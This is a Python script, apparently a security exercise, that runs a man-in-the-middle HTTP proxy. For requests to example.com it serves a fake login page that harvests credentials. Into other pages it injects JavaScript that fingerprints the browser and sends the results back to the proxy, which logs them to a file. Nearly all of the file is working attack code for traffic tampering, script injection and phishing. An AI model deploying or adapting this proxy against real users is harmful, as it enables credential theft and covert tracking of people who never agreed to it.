
import argparse
import socket
import threading
import re
from urllib.parse import unquote

'''
NOTE
The following command should work. Using a different IP or a port smaller than 1024 may result in access denied errors.
python proxy.py -m passive -i 127.0.0.1 -p 8080
python proxy.py -m active -i 127.0.0.1 -p 8080

To kill the process running on a port, use the following command on terminal:
lsof -i :8080 # Get the PID of the process running on port 8080
kill -9 <PID> # Kill the process
'''

DEBUG = True
PROXY_IP = "127.0.0.1"
PROXY_PORT = 8080

def generate_phishing_page():
    if DEBUG:
        print("Generating phishing page...")
    html_content = """
    <html>
    <head><title>Example</title></head>
    <body>
    <h1>Login Page</h1>
    <p>This is a secure login. Please, enter details below.</p>
    <form action="http://example.com/login" method="post">
        <label for="username"> Username: </label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password"> Password: </label><br>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    </body>
    </html>
    """
    return html_content

def parse_and_log_client_data(request_data):
    """
    Parses the GET request with client data and logs it to info2.txt.
    """
    if DEBUG:
        print("Parsing and logging client data...")
    user_agent = re.search(r'user-agent=([^&]+)', request_data)
    screen_res = re.search(r'screen=([^&]+)', request_data)
    language = re.search(r'lang=([^&\s]+)', request_data)

    with open("info2.txt", "a") as f:
        if user_agent:
            f.write("User-Agent: {}\n".format(unquote(user_agent.group(1))))
        if screen_res:
            f.write("Screen Resolution: {}\n".format(unquote(screen_res.group(1))))
        if language:
            f.write("Language: {}\n".format(unquote(language.group(1))))
        f.write("\n")
        print("Client data logged to info2.txt.")

def get_destination_host_port(request_data):
    """
    Parses the HTTP request to extract the destination host and port.
    """
    lines = request_data.splitlines()
    for line in lines:
        if line.startswith("Host:"):
            host_line = line.split(" ")
            if len(host_line) >= 2:
                host = host_line[1].strip()
                # Check if port is specified in the host line
                if ":" in host:
                    host, port = host.split(":")
                    return host, int(port)
                return host, 80  # Default port for HTTP
    return None, None  # Host not found in the request

def modify_content_length_header(response_data, len_js_code):
    if DEBUG:
        print("Modifying Content Length header...")
   # Split the response into headers and body

    if "Content-Length: " in response_data:
        content_length = int(re.search(r"Content-Length: (\d+)\r\n", response_data).group(1))
        response_data = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {content_length + len_js_code}\r\n", response_data)

    return response_data



def inject_javascript(response_data):
    #if DEBUG:
        #print("Injecting JavaScript...")
        #print("Response is:\n{}".format(response_data))
    js_code = """
        <script>
            var user_agent = window.navigator.userAgent;
            var screen_res = window.screen.width.toString() + 'x' + window.screen.height.toString();
            var language = window.navigator.language;
            var url = 'http://' + '{proxy_ip}' + ':' + {proxy_port} + '/?user-agent=' + user_agent + '&screen=' + screen_res + '&lang=' + language;
            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", url, true);
            xhttp.send();
        </script>
    """
    response_data = modify_content_length_header(response_data, len(js_code))
    js_code = js_code.replace("{proxy_ip}", PROXY_IP)
    js_code = js_code.replace("{proxy_port}", str(PROXY_PORT))

    # Find the position of the </body> tag
    body_end_index = response_data.lower().find("</body>")
    
    # If </body> tag is found
    if body_end_index != -1:
        # Split the response data
        part1 = response_data[:body_end_index]
        part2 = response_data[body_end_index:]
        # Reassemble with the JavaScript injected
        malicious_html = part1 + js_code + part2
    else:
        # If </body> tag is not found, append the JavaScript at the end
        malicious_html = response_data + js_code

    #if DEBUG:
        #print("Malicious HTML content:\n{}".format(malicious_html))
    return malicious_html


def handle_active_client(client_socket):
    request = client_socket.recv(8192)
    request = request.replace(b'\r\n\r\n', b'\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n')
    request = request.decode('utf-8')

    host, port = get_destination_host_port(request)
    # Check if request is for the predefined domain for phishing
    if host == "example.com":
        print("Request for phishing domain received.")
        # Send a phishing page (malicious JavaScript)
        client_socket.send(generate_phishing_page().encode('utf-8'))
        print("Phishing page sent to client.")
        client_socket.close()
        print("Client connection closed.")
        return

     # Handle the GET request with client data
    if '/?user-agent=' in request:
        print("Request with client data received.")
        parse_and_log_client_data(request)
        # Send a simple HTTP response (acknowledgment)
        client_socket.send("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
        client_socket.close()
        print("Client connection closed.")
        return

    print("Request for {} received.".format(host))

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((host, 80))
    server_socket.send(request.encode('utf-8'))


    response_data = b""
    c = 0
    server_socket.settimeout(5)
    while True:
        try:
            chunk = server_socket.recv(8192) 
            if DEBUG:
                print(c)
            c += 1
            if DEBUG:
                print('Len of chunk: ',len(chunk) )
            # Check if the end of the HTML content has been reached
            if len(chunk) == 0:
                break
            response_data += chunk
        except socket.timeout:
            break
    print(f"Receieved all chunks: {c}")
    
    try:
        response = response_data.decode('utf-8')
    except UnicodeDecodeError:
        print("UnicodeDecodeError")
        client_socket.close()
        server_socket.close()
        print("Client connection closed.")
        return

    if response:
        #if 'text/html' in response:
        response = inject_javascript(response)
        client_socket.send(response.encode('utf-8'))
        print("Response with injected javascript sent to client.")
        if DEBUG:
            print("Response is:\n{}".format(response))
    else:
        print("No response received from the server.")
        client_socket.close()
        server_socket.close()
        print("Client connection closed.")


def proxy_active(listening_ip, listening_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((listening_ip, int(listening_port)))
    server.listen(5)
    print("Proxy server listening on {}:{}".format(listening_ip, listening_port))

    while True:
        client_socket, client_address = server.accept()
        if client_address[0] != listening_ip:
            print("Invalid client IP. Exiting...")
            exit(1)
        print("\n\nClient connected from {}:{}".format(client_address[0], client_address[1]))
        client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
        client_thread.start()


def proxy_passive(listening_ip, listening_port):
    print("Not implemented yet.")

def main():
    parser = argparse.ArgumentParser(description='Proxy', add_help=False)
    parser.add_argument('-m', '--mode', default=None, help='Mode of operation [active/passive].')
    parser.add_argument('-i', '--listening_ip', default=None, help='IP address to listen on.')
    parser.add_argument('-p', '--listening_port', default=None, help='Port to listen on.')

    args = parser.parse_args()
    print("Arguments: {}".format(args))

    if DEBUG:
        args.listening_ip = "127.0.0.1"
        args.listening_port = "8080"
        args.mode = "active"
    
    if args.listening_ip is None:
        print("No listening IP provided. Exiting...")
        exit(1)
    
    if args.listening_port is None:
        print("No listening port provided. Exiting...")
        exit(1)

    if args.mode == "active":
        proxy_active(args.listening_ip, args.listening_port)
    elif args.mode == "passive":
        proxy_passive(args.listening_ip, args.listening_port)
    else:
        print("Invalid mode provided. Exiting...")
        exit(1)
    

if __name__ == "__main__":
    main()